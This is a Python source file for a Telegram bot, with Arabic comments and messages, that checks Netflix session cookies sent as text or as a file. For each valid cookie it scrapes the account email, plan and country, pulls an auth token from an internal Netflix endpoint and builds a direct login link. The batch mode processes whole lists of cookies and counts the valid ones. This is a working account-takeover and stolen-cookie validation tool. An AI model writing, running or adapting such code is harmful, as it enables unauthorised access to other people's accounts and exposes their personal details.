import asyncio
import aiohttp
import re
import os
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.types import ParseMode

# قراءة التوكن من متغيرات البيئة
BOT_TOKEN = os.getenv("BOT_TOKEN", "")

if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN غير موجود في متغيرات البيئة")

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

class Form(StatesGroup):
    waiting_cookies = State()

async def extract_api_token(session: aiohttp.ClientSession, cookie_str: str) -> dict:
    """استخراج API Token من كوكيز نتفليكس"""
    result = {
        'valid': False,
        'token': None,
        'netflix_id': None,
        'secure_netflix_id': None,
        'auth_url': None,
        'error': None
    }
    
    try:
        cookies_dict = {}
        for cookie in cookie_str.split(';'):
            cookie = cookie.strip()
            if '=' in cookie:
                name, value = cookie.split('=', 1)
                cookies_dict[name.strip()] = value.strip()
        
        netflix_id = cookies_dict.get('NetflixId', '')
        secure_netflix_id = cookies_dict.get('SecureNetflixId', '')
        
        if not netflix_id or not secure_netflix_id:
            result['error'] = 'NetflixId أو SecureNetflixId غير موجود'
            return result
        
        result['netflix_id'] = netflix_id
        result['secure_netflix_id'] = secure_netflix_id
        
        token_url = 'https://www.netflix.com/api/shakti/v1/tokens'
        token_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Cookie': cookie_str,
            'Referer': 'https://www.netflix.com/'
        }
        
        async with session.post(token_url, headers=token_headers, json={}) as resp:
            if resp.status == 200:
                token_data = await resp.json()
                if 'token' in token_data:
                    result['token'] = token_data['token']
                elif 'authToken' in token_data:
                    result['token'] = token_data['authToken']
                
                auth_url = f"https://www.netflix.com/Login?authToken={result['token']}&netflixId={netflix_id}"
                result['auth_url'] = auth_url
                result['valid'] = True
            else:
                result['error'] = f'HTTP {resp.status}'
    except Exception as e:
        result['error'] = str(e)
    
    return result

async def check_netflix_cookie(cookie_str: str) -> dict:
    """فحص الكوكيز واستخراج المعلومات"""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Cookie': cookie_str,
        'Connection': 'keep-alive',
    }
    
    result = {
        'valid': False,
        'email': None,
        'plan': None,
        'country': None,
        'auth_token': None,
        'netflix_id': None,
        'secure_netflix_id': None,
        'auth_url': None,
        'error': None
    }
    
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get('https://www.netflix.com/YourAccount', headers=headers, timeout=15) as resp:
                if resp.status == 200:
                    text = await resp.text()
                    
                    email_match = re.search(r'email["\']?\s*:\s*["\']([^"\']+)["\']', text)
                    if email_match:
                        result['email'] = email_match.group(1)
                    
                    plan_match = re.search(r'plan["\']?\s*:\s*["\']([^"\']+)["\']', text)
                    if plan_match:
                        result['plan'] = plan_match.group(1)
                    
                    country_match = re.search(r'country["\']?\s*:\s*["\']([^"\']+)["\']', text)
                    if country_match:
                        result['country'] = country_match.group(1)
                    
                    result['valid'] = True
                else:
                    result['error'] = f"HTTP {resp.status}"
        except Exception as e:
            result['error'] = str(e)
        
        if result['valid']:
            token_result = await extract_api_token(session, cookie_str)
            result['auth_token'] = token_result.get('token')
            result['netflix_id'] = token_result.get('netflix_id')
            result['secure_netflix_id'] = token_result.get('secure_netflix_id')
            result['auth_url'] = token_result.get('auth_url')
    
    return result

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    welcome_text = """
🎬 **بوت فحص كوكيز نتفليكس**

أرسل لي الكوكيز وسأقوم بفحصه وإرجاع:
✅ معلومات الحساب
🔑 API Token
🔗 رابط تسجيل دخول مباشر

📤 أرسل الكوكيز الآن أو ملف فيه كوكيز.
    """
    await message.reply(welcome_text, parse_mode=ParseMode.MARKDOWN)
    await Form.waiting_cookies.set()

@dp.message_handler(state=Form.waiting_cookies, content_types=types.ContentTypes.TEXT)
async def process_cookies(message: types.Message, state: FSMContext):
    cookie_str = message.text.strip()
    processing_msg = await message.reply("⏳ جاري الفحص...")
    
    result = await check_netflix_cookie(cookie_str)
    await processing_msg.delete()
    
    if result['valid']:
        success_text = f"""
✅ **فحص ناجح!**

📧 الإيميل: `{result['email'] or 'غير متوفر'}`
💳 الخطة: `{result['plan'] or 'غير متوفر'}`
🌍 الدولة: `{result['country'] or 'غير متوفر'}`

🔑 **API Token:**
`{result['auth_token'] or 'تعذر استخراج التوكن'}`

🆔 Netflix ID: `{result['netflix_id'] or 'N/A'}`

🔗 **رابط الدخول:**
`{result['auth_url'] or 'تعذر إنشاء الرابط'}`
        """
        await message.reply(success_text, parse_mode=ParseMode.MARKDOWN)
    else:
        await message.reply(f"❌ فشل الفحص: `{result['error']}`", parse_mode=ParseMode.MARKDOWN)
    
    await state.finish()

@dp.message_handler(state=Form.waiting_cookies, content_types=types.ContentTypes.DOCUMENT)
async def process_cookie_file(message: types.Message, state: FSMContext):
    document = message.document
    file_info = await bot.get_file(document.file_id)
    downloaded_file = await bot.download_file(file_info.file_path)
    content = downloaded_file.read().decode('utf-8', errors='ignore')
    
    cookies_list = [line.strip() for line in content.split('\n') if line.strip()]
    results_text = "📊 **النتائج:**\n\n"
    valid_count = 0
    
    for i, cookie in enumerate(cookies_list, 1):
        result = await check_netflix_cookie(cookie)
        if result['valid']:
            valid_count += 1
            results_text += f"✅ **كوكيز {i}:** {result['email']}\n🔗 {result['auth_url']}\n---\n"
        else:
            results_text += f"❌ **كوكيز {i}:** غير صالح\n---\n"
        await asyncio.sleep(1)
    
    results_text += f"\n📈 **الإجمالي:** {valid_count}/{len(cookies_list)}"
    await message.reply(results_text, parse_mode=ParseMode.MARKDOWN)
    await state.finish()

@dp.message_handler(commands=['cancel'], state='*')
async def cmd_cancel(message: types.Message, state: FSMContext):
    await state.finish()
    await message.reply("❌ تم الإلغاء")

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
